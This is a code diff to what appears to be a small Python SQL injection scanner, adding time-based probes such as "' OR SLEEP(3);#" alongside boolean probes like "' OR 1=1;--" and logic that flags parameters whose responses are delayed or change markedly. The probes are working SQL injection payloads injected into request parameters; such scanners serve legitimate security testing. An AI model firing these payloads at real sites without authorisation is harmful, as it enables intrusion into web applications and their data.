@@ -6,7 +6,13 @@ from requests import Request, Session
 from pprint import pprint
 from urlparse import urlparse
 
+CONFIG_SQLI_SLEEP_TIME = 3
+
 SQLI_PROBES = [
+	"' OR SLEEP(%d);#" % CONFIG_SQLI_SLEEP_TIME,
+	"' OR SLEEP(%d);--" % CONFIG_SQLI_SLEEP_TIME,
+	"' OR sleep(%d);#" % CONFIG_SQLI_SLEEP_TIME,
+	"' OR sleep(%d);--" % CONFIG_SQLI_SLEEP_TIME,
 	"' OR 1=1;#",
 	"' OR 1=1;--"
 ]
@@ -100,8 +106,13 @@ def scan(url, params):
 				params_copy[param] = probe
 				response = make_request(method, url, params_copy)
 				delta_lines = sum(1 for _ in difflib.context_diff(prev_html, response.content))
+				if "SLEEP" in probe or "sleep" in probe:
+					if response.elapsed.total_seconds() > CONFIG_SQLI_SLEEP_TIME:
+						print("[!] Highly possible SQLi, probe triggered server sleep using parameter value (%s=%s)" % (param, probe))
+						break
 				if delta_lines > 5:
 					print("[!] Possible SQLi, probe triggered large response delta using parameter value (%s=%s)" % (param, probe))
+					break
 
 def make_request(method, url, params):
 	if method == 'POST':
